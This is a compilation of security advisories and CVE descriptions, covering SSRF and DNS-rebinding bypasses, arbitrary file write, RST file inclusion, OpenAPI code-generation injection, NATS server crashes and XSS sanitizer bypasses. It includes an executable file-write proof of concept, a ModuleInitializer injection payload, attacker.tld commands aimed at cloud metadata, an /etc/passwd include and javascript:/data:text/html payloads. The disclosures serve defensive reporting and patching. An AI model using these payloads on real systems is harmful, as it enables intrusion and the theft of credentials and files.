## Summary
`http.paginate` validates only the initial `base_url`, then follows server-supplied pagination targets (RFC 5988 `Link: rel="next"` headers, cursor/offset URLs) in a loop **without revalidating each follow-up URL**. An attacker's first-page response can point `next` at an internal address, causing a second-order SSRF whose internal body is aggregated into the returned items.

## Root Cause
`src/core/modules/atomic/http/paginate.py:495` validates `base_url` (first URL only). The pagination loop `_paginate_link_header` reads `next_url` via `_parse_link_header` (:203), sets `url=next_url` (:208), and calls `session.request(method, url)` (:196) with NO validate call in the loop (:186-208 has zero guard calls).

## Impact
Readable second-order SSRF that bypasses the SSRF control; internal/metadata body aggregated into `all_items` and returned to the caller (C:H, S:C).

## Proof of Concept
Verified live: `http.paginate` with allowlisted base `127.0.0.1` followed a `Link: <http://127.0.0.3/...>; rel="next"` (non-allowlisted) and returned `INTERNAL-NEXTPAGE-SECRET` in the aggregated items.
```
execute_module http.paginate {"url":"http://attacker.tld/p1","strategy":"link_header"}
attacker p1 response header: Link: <http://<cloud-metadata-ip>/latest/meta-data/>; rel="next"
```

## Attack Chain
1. Entry: `http.paginate {url:"http://attacker.tld/p1", strategy:"link_header"}`. Guard: `validate_url_with_env_config(base_url)` (paginate.py:495) — validates the FIRST url only.
2. Sink: `_paginate_link_header` reads `next_url` (`_parse_link_header` :203), `url=next_url` (:208), `session.request(method,url)` (:196) — NO validate call in the loop. Bypass proof: only :495 validates; loop at :186-208 has zero guard calls.
3. Impact: internal body aggregated into `all_items` and returned → readable second-order SSRF.

## Bypass Evidence
Live PoC followed a `Link` header into non-allowlisted loopback and returned the internal marker in aggregated results. Only `base_url` is validated; the follow loop never revalidates.

## Affected Versions
`<= 2.26.6` — `paginate.py:495` + loop present on latest release tag.

## Suggested Fix
Run every follow-up URL (Link header, cursor, offset target) through `validate_url_with_env_config` before fetching it inside the pagination loop.

## Credit

Vulnerability discovered by zx (Jace).

## Summary
`validate_url_ssrf` resolves the hostname, checks the IP against private ranges, then **discards the IP and returns the hostname URL string**. aiohttp performs a fresh, independent DNS resolution at connect time. An attacker controlling DNS for a hostname (TTL 0, alternating public IP and internal IP) passes validation on the first lookup and connects to the internal IP on the second — a classic check-then-use race. SECURITY_SSRF.md line 63 explicitly claims DNS-rebinding is prevented; it is not.

## Root Cause
`src/core/utils.py:523` returns the hostname URL after validation; the resolved IP is never pinned. A repo grep of `http/` and `utils.py` for `TCPConnector` / `resolver` / `response.history` / `on_request_redirect` / IP-pinning returns NONE. Each module builds a fresh `ClientSession` per call → the connect-time `getaddrinfo` is independent of the validation-time lookup.

## Impact
Defeats the SSRF guard on ALL modules that call it (readable internal fetch). Independent of IP-range completeness — the private IP is never presented to `is_private_ip`. Requires attacker DNS control + winning the resolution race → AC:H.

## Proof of Concept
Code-proven: `validate_url_ssrf` returns the hostname (utils.py:523); no pinned-IP connector anywhere. Two independent resolutions occur (validation-time and aiohttp connect-time).
```
attacker DNS: rebind.attacker.tld TTL 0, alternating public IP and the cloud metadata IP
execute_module http.get {"url":"http://rebind.attacker.tld/latest/meta-data/..."}
```

## Attack Chain
1. Entry: `http.get {url:"http://rebind.attacker.tld/..."}`. Guard: `validate_url_with_env_config`. Bypass proof: `getaddrinfo(rebind.attacker.tld)` returns the public IP, `is_private_ip=False` (utils.py:511-519); returns the hostname URL (:523) — the IP is discarded.
2. Sink: `session.get("http://rebind.attacker.tld/...")` (get.py:116). aiohttp performs a FRESH independent `getaddrinfo` at connect → now resolves to the internal IP. Bypass proof: no `TCPConnector`/`AsyncResolver`/pinned-IP in `http/` (grep confirms none). Two lookups.
3. Impact: internal fetch, body returned.

## Bypass Evidence
`utils.py:523` returns the hostname string, not a pinned IP; grep confirms no IP pinning or custom resolver anywhere on the path; fresh `ClientSession` per call guarantees an independent second resolution.

## Affected Versions
`<= 2.26.6` — `utils.py:523` present on latest release tag; no pinning added on HEAD.

## Suggested Fix
Resolve the hostname once, pin the validated IP, and connect to that IP (custom `TCPConnector`/resolver) — reject any connect-time resolution that differs. This is the fix SECURITY_SSRF.md already claims is in place.

## Credit

Vulnerability discovered by zx (Jace).

# [CRITICAL] Arbitrary file write via unguarded `data.*` / `file.*` write modules — incomplete fix of GHSA-2956

- **CWE:** CWE-22 (Path Traversal) / CWE-73 (External Control of File Name or Path); impact reaches CWE-94 (code execution via file overwrite).
- **CVSS v3.1:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = **9.3 Critical** (S:C because a write escapes the intended sandbox confinement into the host filesystem / other components).
  - AV:N — reachable via the MCP server / recipe engine (`execute_module`). AC:L — deterministic. PR:L — any client able to run a module/recipe (the same attacker model as GHSA-2956; unauthenticated on the HTTP MCP surface per CVE-2026-55786). UI:N. S:C — escapes `FLYTO_SANDBOX_DIR`. C/I/A:H — arbitrary-content write to any absolute path → overwrite app code / recipes / `~/.bashrc` / cron / `authorized_keys` → RCE.
- **Affected component:** `flyto-core` (PyPI `flyto-core`), HEAD `ae2b38e` (v2.26.7 line). Modules `data.csv.write` (`src/core/modules/atomic/data/csv_write.py`), `data.json_to_csv` (`.../data/json_to_csv.py`), `file.copy` (`.../file/copy.py`), `file.move` (`.../file/move.py`) — and the broader `data.*`/`file.*`/report-writer families that do not call the path guard.
- **Relationship:** **Incomplete fix of GHSA-2956-977x-2w3r** (Critical arbitrary file write, patched in v2.26.6 by commit `d5f89d7`). That fix routed a hand-picked module list (`image.download/convert/resize/crop/compress/rotate/watermark/qrcode_generate`, `document.excel_write/pdf_fill_form/word_to_pdf/pdf_to_word`, `browser.pagination` checkpoint) through `validate_path_with_env_config()`. It did **not** cover the `data.*` and `file.*` write families, which still write a client-controlled path with no confinement.

## Reachability (hop-by-hop, guards resolved)
1. Client invokes a module via the recipe engine / MCP `execute_module` (`src/core/mcp_handler.py`, `mcp_server.py`) — the same surface as GHSA-2956 / CVE-2026-55786.
2. `data.csv.write` reads `file_path = params.get('file_path')` and `data` (both client-controlled). Its only path check is `if '..' in file_path: raise` — a denylist that does **not** block absolute paths.
3. It calls `os.makedirs(os.path.dirname(file_path), exist_ok=True)` then `open(file_path, 'w')` and writes `data`. **No call to `validate_path_with_env_config()`** — so `FLYTO_SANDBOX_DIR` confinement is never applied.
4. `data.json_to_csv` (`output_path`), `file.copy` / `file.move` (`shutil.copy2`/`shutil.move` to `destination`) have **no path check at all**.
5. An absolute path such as `/home/<user>/.bashrc`, `/app/src/core/modules/.../<mod>.py`, or a `.flyto` recipe file is written verbatim, outside the sandbox.

**Guard analysis:** the GHSA-2956 enforcement is per-module (e.g. `image/download.py:21` imports and calls `validate_path_with_env_config`). There is **no central path enforcement** in the runtime — `runtime/languages.py`'s `PathTraversalError` guards *plugin entry-point* loading, not module output paths. So a module that omits the per-module call is entirely unconfined.

## Root cause
The remediation for GHSA-2956 confined writes by adding a per-module `validate_path_with_env_config()` call to an explicit list of modules, rather than enforcing confinement centrally. Any file-writing module absent from that list �� the entire `data.*` and `file.*` families here — remains an arbitrary-write primitive. `data.csv.write`'s `'..'`-substring check is a denylist that misses absolute paths.

## Impact
Arbitrary file write with attacker-controlled content and path, escaping `FLYTO_SANDBOX_DIR`. Overwriting a Python module under the install dir, a `.flyto` recipe, a shell rc, a crontab, or `~/.ssh/authorized_keys` yields code execution / full host compromise — the same impact GHSA-2956 was rated Critical for.

## Executable PoC (benign sentinel, local only)
`FLYTO_SANDBOX_DIR` is set to the intended confinement; the module writes *outside* it while the GHSA-2956 guard rejects the same path.

```python
import os, sys, asyncio
SBX = os.environ.setdefault('FLYTO_SANDBOX_DIR', "/tmp/flyto_sbx"); os.makedirs(SBX, exist_ok=True)
sys.path.insert(0, "<flyto-core>/src")
OUT = "/tmp/flyto_PWNED_OUTSIDE.csv"           # absolute, outside the sandbox, no ".."
from core.utils import validate_path_with_env_config, PathTraversalError
try:
    validate_path_with_env_config(OUT); print("[guard] UNEXPECTED allow")
except PathTraversalError:
    print("[guard] GHSA-2956 guard REJECTS out-of-sandbox path (as intended)")
async def call(W, p): return await W(p, {}).execute()
from core.modules.atomic.data.csv_write import csv_write
from core.modules.atomic.data.json_to_csv import json_to_csv
asyncio.run(call(csv_write,  {'file_path': OUT, 'data':[{'pwn':'SENTINEL_CSV'}]}))
asyncio.run(call(json_to_csv,{'input_data':[{'pwn':'SENTINEL_JSON'}], 'output_path': OUT+'.json.csv'}))
print("wrote outside sandbox:", os.path.exists(OUT),
      "| inside sandbox?", os.path.realpath(OUT).startswith(os.path.realpath(SBX)))
```

Observed output:
```
[guard] GHSA-2956 guard validate_path_with_env_config() REJECTS out-of-sandbox path
[data.csv.write]   wrote=True inside_sandbox=False
[data.json_to_csv] wrote=True inside_sandbox=False
BUG CONFIRMED (arbitrary write outside sandbox)
  sample content: pwn / SENTINEL_CSV
```

## Adversarial re-read (what I tried to refute it with)
- **Central path guard?** No — `runtime/languages.py` `PathTraversalError` only guards plugin entry-point loading; the GHSA-2956 fix is per-module (confirmed at `image/download.py:21`). A module without the call is unconfined.
- **`'..'` check in `csv_write`?** Denylist; absolute paths contain no `..` → bypassed (PoC uses `/tmp/...`). `json_to_csv`/`file.copy`/`file.move` have no check at all.
- **`required_permissions=['filesystem.write']`?** A capability flag, not a path confinement — the GHSA-2956-guarded modules declare it too and still needed the guard.
- **Sandbox default?** `FLYTO_SANDBOX_DIR` defaults to cwd (warning only); the PoC sets it explicitly to show the confinement is bypassed even when configured.
- Result: no concrete blocker. CONFIRMED (incomplete fix).

## Remediation
Enforce confinement centrally: route every filesystem write through `validate_path_with_env_config()` at the engine/module-base layer (e.g. in the write path of `BaseModule`, or a `filesystem.write`-capability hook), instead of per-module opt-in. As an immediate patch, add the call to `data.csv.write`, `data.json_to_csv`, `file.copy`, `file.move`, and audit every module with `filesystem.write` in `required_permissions`. Replace the `'..'` substring denylist with the canonical `realpath`+`startswith(base)` check already in `validate_path_safe`.

## Confidence
High — executed PoC (benign sentinel) shows two modules writing attacker-controlled content to an absolute path outside `FLYTO_SANDBOX_DIR`, while the GHSA-2956 guard rejects the same path.

## Proof-of-Concept source (`poc_arbitrary_write.py`)

```python
"""PoC: arbitrary file write via unguarded sibling write modules (incomplete fix of GHSA-2956).
Run: FLYTO_SANDBOX_DIR is set to the intended confinement; the modules write OUTSIDE it."""
import os, sys, asyncio
SBX = os.environ.setdefault('FLYTO_SANDBOX_DIR', "/tmp/home-aoc-CVEs/a257f729-6be4-42cc-a7ec-4342ae8294bf/scratchpad/flyto_sbx")
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "..", "flyto-core", "src"))
sys.path.insert(0, "/home/aoc/CVEs/flyto-core/src")
OUT="/tmp/-home-aoc-CVEs/a257f729-6be4-42cc-a7ec-4342ae8294bf/scratchpad/flyto_PWNED_OUTSIDE.csv"; OUT2="/tmp/-home-aoc-CVEs/a257f729-6be4-42cc-a7ec-4342ae8294bf/scratchpad/flyto_PWNED_json.csv"
from core.utils import validate_path_with_env_config, PathTraversalError
try:
    validate_path_with_env_config(OUT); print("[guard] UNEXPECTED allow")
except PathTraversalError:
    print("[guard] GHSA-2956 guard validate_path_with_env_config() REJECTS out-of-sandbox path")
async def call(W, p): return await W(p, {}).execute()
from core.modules.atomic.data.csv_write import csv_write
from core.modules.atomic.data.json_to_csv import json_to_csv
r1 = asyncio.run(call(csv_write, {'file_path': OUT, 'data':[{'pwn':'SENTINEL_CSV'}]}))
r2 = asyncio.run(call(json_to_csv, {'input_data':[{'pwn':'SENTINEL_JSON'}], 'output_path': OUT2}))
for tag,out in [('data.csv.write',OUT),('data.json_to_csv',OUT2)]:
    inside = os.path.realpath(out).startswith(os.path.realpath(SBX))
    print(f"[{tag}] wrote={os.path.exists(out)} inside_sandbox={inside} -> {out}")
ok = os.path.exists(OUT) and not os.path.realpath(OUT).startswith(os.path.realpath(SBX))
print("BUG CONFIRMED (arbitrary write outside sandbox)" if ok else "NOT CONFIRMED")
print("  sample content:", open(OUT).read().strip())

```

cves.summary: ## Summary django-docutils before `0.30.0` rendered reStructuredText through Docutils without protected web-safe defaults. Public rendering paths, including `publish_doctree`, `publish_html_from_source`, `publish_html_from_doctree`, `publish_parts_from_doctree`, the `{% rst %}` template tag, the `rst` template filter, `DocutilsTemplates`, and `DocutilsView`, could process attacker-controlled RST with Docutils directives that read local files, fetch URL-backed content, or emit raw HTML. The issue is fixed in `0.30.0` by disabling Docutils file insertion, raw directives, local `docutils.conf` processing, and unsafe URI schemes by default, and by sanitizing doctrees before HTML is emitted. Applications are affected when they render attacker-controlled or lower-trust RST through django-docutils without their own safe Docutils configuration. Applications that only render trusted static RST are not affected unless that content can be influenced by an attacker. ## Impact An attacker who can influence RST rendered by a vulnerable django-docutils integration may be able to read files readable by the Django worker process, trigger server-side requests through URL-backed directives, or inject raw HTML/JavaScript into rendered output. Examples of affected application patterns include comments, wiki pages, blog bodies, profile or biography fields, CMS fields, uploaded RST documents, API-supplied RST, or overridden view content methods that return user-supplied RST. Potential impact includes disclosure of application configuration, environment files, credentials, source files, templates, mounted secrets, and logs readable by the process. UI escaping after rendering is not sufficient for file disclosure because the server-side read occurs before HTML reaches the client. ## Affected versions Affected package: `django-docutils` on PyPI Affected versions: `<= 0.29.0` Patched versions: `>= 0.30.0` ## Technical details Before `0.30.0`, django-docutils handed RST content to Docutils without forcing these web-safe settings: ```python { "file_insertion_enabled": False, "raw_enabled": False, "_disable_config": True, } ``` Docutils treats file insertion and raw content as legitimate features for trusted documents. In a web application that renders lower-trust RST, those defaults can expose server-side data or emit attacker-controlled HTML unless the application disables the features. The vulnerable behavior included: - `.. include:: ` reading local files - `.. include:: ` fetching URL-backed content server-side - `.. csv-table:: :file:` reading local files - `.. csv-table:: :url:` fetching URL-backed content server-side - `.. raw:: html` emitting unescaped HTML - `.. raw:: html :file:` reading and emitting file-backed raw content - local `docutils.conf` configuration re-enabling unsafe behavior ## Proof of concept This minimal harness uses the public `{% rst %}` template tag. On vulnerable versions, the include directive expands server-side and the raw directive emits unescaped HTML. On fixed versions, both directives are disabled under the default configuration. ```python import django from django.conf import settings settings.configure( INSTALLED_APPS=["django_docutils"], TEMPLATES=[{ "BACKEND": "django.template.backends.django.DjangoTemplates", "DIRS": [], "APP_DIRS": False, "OPTIONS": {"libraries": {"dj": "django_docutils.templatetags.django_docutils"}}, }], # DJANGO_DOCUTILS_LIB_RST intentionally unset == default install. ) django.setup() from django.template import engines dj = engines["django"] def render_user_rst(rst: str) -> str: return dj.from_string("{% load dj %}{% rst content %}").render({"content": rst}) print(render_user_rst(".. include:: /etc/passwd\n")) print(render_user_rst(".. raw:: html\n\n x\n")) ``` Expected behavior on vulnerable releases such as `0.28.0` and `0.29.0`: ```text The include directive emits readable file contents. The raw directive emits x as HTML. ``` Expected behavior on fixed releases such as `0.30.0` and later: ```text The include directive is disabled. The raw directive is disabled. ``` ## Remediation Upgrade to django-docutils `0.30.0` or later. For trusted static RST that intentionally depends on unsafe Docutils features, opt in explicitly: ```python DJANGO_DOCUTILS_LIB_RST = { "allow_unsafe_docutils_settings": True, "docutils": { "raw_enabled": True, "file_insertion_enabled": True, "_disable_config": False, }, } ``` Do not enable unsafe Docutils settings for comments, profile text, CMS fields, uploaded files, API request data, or other lower-trust content. Note: `django-docutils==0.30.0` has an undeclared runtime dependency on `typing-extensions`; install it alongside if your environment doesn't already provide it (tracked separately as a packaging fix). ## Related - django-docutils documentation: - django-docutils 0.30.0: - - - django-docutils security topic: - django-docutils changelog: - django-docutils PyPI: - django-docutils source repository: - Docutils security guide: - Docutils configuration reference: - Django security overview: - Related NiceGUI advisory for the same Docutils sink pattern: - Related NiceGUI CVE entry: ## Credit Thanks to the reporters who disclosed and helped characterize this issue.

cves.summary:
### Summary
jane-php resolves external `$ref` targets at code-generation time via `file_get_contents($ref)` (jane-php/json-schema-runtime/Reference.php::doResolve) with no scheme/path restriction. An attacker-controlled OpenAPI document can therefore cause: `$ref: 'http://attacker/x'` -> SSRF (HTTP GET at gen time; response inlined = RFI); `$ref: '/abs/file'` -> LFI; `$ref: '../secret.yaml'` -> path-traversal LFI (CWE-22, arbitrary local JSON/YAML read). Verified 7.11.2/PHP8.1 (listener records the fetch; remote + `../` local content inlined into the generated code). `file://` rejected. CWE-918/CWE-98/CWE-611/CWE-22.

### Details
```php
// Reference.php::doResolve()
$contents = file_get_contents($fragment); // $fragment = attacker-controlled $ref URI
```

### Impact
Generating PHP with jane from an attacker-influenced OpenAPI document issues HTTP requests to attacker-chosen URLs (SSRF — internal services, cloud metadata) and reads arbitrary local files (LFI via `../`), at build/CI time, inlining results into the output.

### PoC
`reproduce.sh` (+ `make_spec.py`, `gen.php`): runs jane on a remote-$ref spec (local listener records the SSRF, output checked for the inlined response) and a `../`-traversal local-$ref spec (output checked for the leaked file).

### Suggested fix
Disable remote `$ref` fetching by default (or allow-list); confine local `$ref` to the spec directory (reject absolute paths and `..`). Don't `file_get_contents($ref)` on attacker-controlled URIs.

cves.summary:
### Summary

Refitter emits the spec's content-type key (content map key in requestBody/responses) verbatim into a Refit `[Headers("Accept: <ct>", "Content-Type: <ct>")]` attribute string without escaping
`"`. A crafted value survives Refitter's default OpenAPI validation, breaks out of the attribute and
the enclosing interface + namespace, injects a top-level `file class` with a `[ModuleInitializer]`
method, and reopens so the file stays valid. .NET runs `[ModuleInitializer]` methods at assembly
load, so the attacker's code executes at application startup. Verified on Refitter 2.0.0 / .NET 8.

The malicious input is a content-type KEY such as: content: { 'application/<breakout>': {schema} }.
No `--skip-validation` is required.

### PoC

`reproduce.sh` (+ `make_spec.py`) attached: generates with default validation, compiles into a
console app, runs it (Main does not touch the client), and shows a marker written at assembly load.

### Impact

Code execution at assembly load (process startup) in any application that compiles a Refitter client
generated from an attacker-controlled or attacker-influenced OpenAPI description. Estimated Critical, e.g.
`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` (the CNA sets the final score).

### Suggested fix

Escape every spec-derived string before emitting it into a Refit attribute (escape `"`, `\`,
reject newlines) and validate characters. We recommend auditing all attribute emissions that embed
spec-derived values, using one shared encoder.

cves.summary:
### Summary

Refitter emits each OpenAPI path (the paths-object key) verbatim into a Refit `[Get("<path>")]`
attribute string, without escaping `"` or restricting characters. A crafted single-line, /-prefixed
path survives Refitter's default OpenAPI validation yet closes the attribute string and the enclosing
interface + namespace, injects a top-level `file class` with a `[ModuleInitializer]` method, and
reopens a namespace + interface so the file stays valid. .NET runs `[ModuleInitializer]` methods when
the generated assembly is loaded, so the attacker's code executes at application startup. Verified on
Refitter 2.0.0 / .NET 8.

### Details

```
[Get("/p")] Task<string> Dummy(); } }
file class Evil { [System.Runtime.CompilerServices.ModuleInitializer]
  internal static void Init(){ /* attacker code */ } }
namespace N2 { public partial interface I2 { [Get("/q")]
        Task<string> GetU(string id);
    }
}
```

No `--skip-validation` is needed (the payload is a valid single-line path). The generated `.cs` is
compiled into the victim application; the module initializer runs at assembly load. This is distinct
from the value sinks (enum/default), which are escaped; the path sink has no escaping. The
`[Header("<name>")]` attribute is likewise emitted raw (header parameter names), at minimum a
build-breaking DoS.

### PoC

`reproduce.sh` (+ `make_spec.py`) attached: generates with default validation, compiles into a console
app, runs it (Main does not touch the client), and shows a marker written at assembly load. Verified
on 2.0.0.

### Impact

Code execution at assembly load (process startup) in any application that compiles a Refitter client
generated from an attacker-controlled or attacker-influenced OpenAPI description.

### Suggested fix

Escape the route template before emitting it into `[Get("…")]` (escape `"`, `\`, reject newlines) and
validate that paths contain only legal URI-template characters. Apply the same encoding to
`[Header(…)]`, `[Post/Put/Delete(…)]`, and every attribute that embeds a spec-derived string.

cves.summary:
### Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server can accept client connections over WebSocket and can also support MQTT over WebSocket when MQTT is configured.

### Problem Description

A WebSocket listener could route requests for the MQTT-over-WebSocket path into MQTT handling even when MQTT was not configured.

On affected deployments, an unauthenticated client with access to the WebSocket listener could reach uninitialized MQTT state and crash the server process.

This affects deployments that enable WebSocket while leaving MQTT disabled. Deployments where MQTT is intentionally configured initialize the MQTT state and are not affected in the same way.

### Affected Versions

Versions v2.14.2, v2.12.11 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.12.

### Workarounds

Deployments not using WebSocket are not affected. Deployments using both WebSockets and MQTT are not affected. No known workaround for deployments that need WebSocket without MQTT-over-WebSocket. Upgrade to a fixed release.

### References

 * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-p957-7v2w-g93g>
 * Credit: Vasco Franco, Trail of Bits

### Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server supports MQTT clients, including authentication and parsing of MQTT `CONNECT` packets.

### Problem Description

An unauthenticated MQTT client could cause the server to retain large incomplete MQTT `CONNECT` packets before authentication completed.

The parser retained partial pre-authentication packet data while waiting for the advertised MQTT packet length to be completed. An attacker could therefore consume server memory until authentication timeouts closed the connections.

### Affected Versions

Versions v2.14.2, v2.12.11 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.12.

### Workarounds

Deployments not using MQTT are not affected. Deployments that need MQTT should upgrade to a fixed release.

### References

 * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-r72h-j7qq-v6qg>
 * Credit: Asritha Bodepudi, Trail of Bits

### Background

NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT and edge computing.

The NATS Server MQTT support includes retained messages and QoS1+ durable delivery. NATS subscription permissions can allow broad wildcard subscriptions while denying more sensitive subjects.

### Problem Description

MQTT retained message delivery and QoS1+ durable replay could deliver messages whose original topics matched a subscriber's configured subscribe deny rules.

Normal live delivery applied the delivery-time deny check. These MQTT delivery paths did not consistently recheck the concrete original topic before sending the MQTT `PUBLISH` to the subscriber.

The issue affects MQTT subscribers with broad wildcard subscribe permissions where more specific topics are denied. Normal live delivery can be blocked while retained or replayed delivery still sends the denied topic.

### Affected Versions

Versions v2.14.2, v2.12.11 and below are vulnerable. The issue is fixed in v2.14.3 and v2.12.12.

### Workarounds

No known workaround for deployments that require MQTT. Upgrade to a fixed release. Deployments not using MQTT are not affected.

### References

 * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-7qmq-8cc4-hxwg>
 * Credit: Asritha Bodepudi, Trail of Bits

The default configurations for McAfee Virus Scan and Norton Anti-Virus virus checkers do not check files in the RECYCLED folder that is used by the Windows Recycle Bin utility, which allows attackers to store malicious code without detection.
RealMedia server allows remote attackers to cause a denial of service via a long ramgen request.
Internet Explorer 5.0 and 5.01 allows remote attackers to bypass the cross frame security policy and read files via the external.NavigateAndFind function.

Stack-based buffer overflow in xpm_extract_color (io-xpm.c) in the XPM image decoder for gtk+ 2.4.4 (gtk2) and earlier, and gdk-pixbuf before 0.22, may allow remote attackers to execute arbitrary code via a certain color string.  NOTE: this identifier is ONLY for gtk+.  It was incorrectly referenced in an advisory for a different issue (CVE-2004-0688).

The smiley theme functionality in Gaim before 0.82 allows remote attackers to execute arbitrary commands via shell metacharacters in the filename of the tar file that is dragged to the smiley selector.
GAMSoft TelSrv telnet server 1.5 and earlier allows remote attackers to cause a denial of service via a long username.
rpc.lockd in Red Hat Linux 6.1 and 6.2 allows remote attackers to cause a denial of service via a malformed request.
Linux kernel before 2.3.18 or 2.2.13pre15, with SLIP and PPP options, allows local unprivileged users to forge IP packets via the TIOCSETD option on tty devices.

ColdFusion is affected by an Improper Restriction of XML External Entity Reference ('XXE') vulnerability that could lead to arbitrary file system read. An attacker could exploit this vulnerability to access sensitive files and directories outside the intended access scope. Exploitation of this issue does not require user interaction. Scope is changed.
ColdFusion is affected by a Server-Side Request Forgery (SSRF) vulnerability that could result in privilege escalation. Exploitation of this issue does not require user interaction. Scope is changed.

ColdFusion is affected by an Improper Control of Generation of Code ('Code Injection') vulnerability that could result in arbitrary code execution in the context of the current user. An attacker could exploit this vulnerability to execute arbitrary code. Exploitation of this issue does not require user interaction.

categorie.php3 in Black Tie Project (BTP) 0.4b through 0.5b allows remote attackers to determine the absolute path of the web server via an invalid category ID (cid) parameter, which leaks the pathname in an error message.
Directory traversal vulnerability in Xerver Free Web Server 2.10 and earlier allows remote attackers to list arbitrary directories via a .. (dot dot) in an HTTP GET request.
Xerver Free Web Server 2.10 and earlier allows remote attackers to cause a denial of service (crash) via an HTTP request that contains many "C:/" sequences.

Buffer overflow in webpsvc.exe for Talentsoft Web+ 5.0 and earlier allows remote attackers to execute arbitrary code via a long argument to webplus.exe program, which triggers the overflow in webpsvc.exe.
AdCycle 1.17 and earlier allow remote attackers to modify SQL queries, which are not properly sanitized before being passed to the MySQL database.

The default configuration of XFCE 3.5.1 bypasses the Xauthority access control mechanism with an "xhost + localhost" command in the xinitrc program, which allows local users to sniff X Windows traffic and gain privileges.

A privilege escalation vulnerability in Palo Alto Networks Cortex XDR Broker VM enables an authenticated low privileged user with man-in-the-middle (MitM) access to execute code with root privileges on the Broker VM.

The zipMoney(Zip Co) Payments Plugin for WooCommerce WordPress plugin before 2.4.0 does not perform any authorisation checks on one of its front-end request handlers, and does not restrict which option name a caller may supply, allowing unauthenticated users to delete arbitrary WordPress options. This can be used to destroy site and access control configuration, deactivate every installed zipMoney(Zip Co) Payments Plugin for WooCommerce WordPress plugin before 2.4.0, and take the site offline.

The Registration Form for WooCommerce WordPress plugin before 1.1.3 does not validate that the form referenced during registration is a legitimate registration form, reading the permitted-role allow-list from an arbitrary attacker-controlled post instead. A user able to create a post (Contributor and above) can therefore register a new account with an arbitrary role, including Administrator, leading to full site takeover. This is an incomplete fix of CVE-2026-54807.

A code execution vulnerability in Palo Alto Networks Checkov by Prisma® Cloud can allow arbitrary code execution when Checkov scans a directory that contains an attacker-controlled configuration file.

EMC NetWorker (formerly Legato NetWorker) before 7.0 stores passwords in plaintext in the daemon.log file, which allows local users to gain privileges by reading the password from the file.  NOTE: this was originally reported for Legato NetWorker 6.1 on the Solaris 7 platform.

## Summary

`@nuxtjs/mdc` renders untrusted markdown (including raw HTML) to a Vue component tree. Across two prior advisories it added a URL/attribute sanitizer to block dangerous links in that HTML: `validateProps` / `validateProp` and an `unsafeLinkPrefix` deny-list (`dist/runtime/parser/utils/props.js`). The sanitizer runs at parse time (`dist/runtime/parser/compiler.js`) and `parseMarkdown` enables raw HTML by default (`allowDangerousHtml: true`, `dist/runtime/parser/options.js`), so the sanitizer is the only barrier and it applies with no configuration required.

Two sibling vectors bypass that sanitizer at the default configuration:

1. SVG anchor `xlink:href`. `validateProp` only scheme-checks attributes named exactly `href` or `src`:

   ```
   if (attribute === "href" || attribute === "src") return isAnchorLinkAllowed(value);
   return true;
   ```

   An `xlink:href` (parsed to the hast property `xLinkHref`) is neither, so a `javascript:` URL on an SVG `<a>` is passed through. The renderer maps the property back to the real attribute (`MDCRenderer.vue`: `find(html, "xLinkHref").attribute` is `xlink:href`), so the output element is `<a xlink:href="javascript:...">`. Clicking it runs the script in the page origin. Plain `<a href="javascript:...">` is correctly stripped, which is what makes this the un-patched sibling.

2. `<iframe src="data:text/html,...">`. `data:text/html` is present in `unsafeLinkPrefix`, but the check compares it against `url.protocol`:

   ```
   if (unsafeLinkPrefix.some((prefix) => url.protocol.toLowerCase().startsWith(prefix))) return false;
   ```

   For any data URI `url.protocol` is just `"data:"`, so `"data:".startsWith("data:text/html")` is always false. Every `data:text/*` entry in the deny-list is therefore dead code, and `<iframe src="data:text/html,<script>...</script>">` is allowed (iframe is not in the render-time `dangerousTags`, which is only `["script","base"]`). The framed document executes script in an opaque origin. For contrast, `srcdoc` and `object` are blocked, so this is a precise gap rather than a general absence of filtering.

## Reproduction

I will attach the zip file for POC, you can simply extract and run `./poc.sh` to install mdc and show the poc in the html file.
[nuxtjs-mdc-xss_poc.zip](https://github.com/user-attachments/files/29175603/nuxtjs-mdc-xss_poc.zip)

Two zero-argument checks:

1. `sh poc/poc.sh` installs `@nuxtjs/mdc` and runs `parseMarkdown` (the documented API) at default. It shows the parsed tree retains `a { xLinkHref: "javascript:..." }` and `iframe { src: "data:text/html,..." }`, while the control payloads `href="javascript:..."` and `srcdoc=...` are removed by the sanitizer. This isolates the sanitizer bypass deterministically.
2. `poc/poc.sh` also serves `poc/poc.html` over http (data: iframes and javascript: links are restricted under the file:// origin, so http is used). Open the printed URL and click the blue SVG link. The page contains the exact DOM the renderer produces for those parsed nodes; clicking the SVG link executes script in the page origin (same-origin), and the data:text/html iframe executes on load. The page prints VULNERABLE for each that fires.

Both vectors were confirmed executing in a current Chromium build: the SVG `xlink:href` link runs script in the document origin on click, and the data:text/html iframe runs script on load.

## Suggested fix

In `validateProp`, scheme-check `xlink:href` (and the hast `xLinkHref`) the same way as `href`/`src`. In `isAnchorLinkAllowed`, compare the dangerous MIME-typed entries against the full URL (or `href`), not against `url.protocol`, so `data:text/html` is actually matched; or add `iframe` to the render-time dangerous-tag set / restrict iframe `src` schemes.

cves.summary: Format string vulnerability in gm4 (aka m4) on Mac OS X may allow local users to gain privileges if gm4 is called by setuid programs.
nidump on MacOS X before 10.3 allows local users to read the encrypted passwords from the password file by specifying passwd as a command line argument.
nobo 1.2 allows remote attackers to cause a denial of service (crash) via a series of large UDP packets.

KTH Kerberos IV allows local users to change the configuration of a Kerberos server running at an elevated privilege by specifying an alternate directory using with the KRBCONFDIR environmental variable, which allows the user to gain additional privileges.
KTH Kerberos IV allows local users to specify an alternate proxy using the krb4_proxy variable, which allows the user to generate false proxy responses and possibly gain privileges.
Anonymous FTP is enabled.
ICMP echo (ping) is allowed from arbitrary hosts.

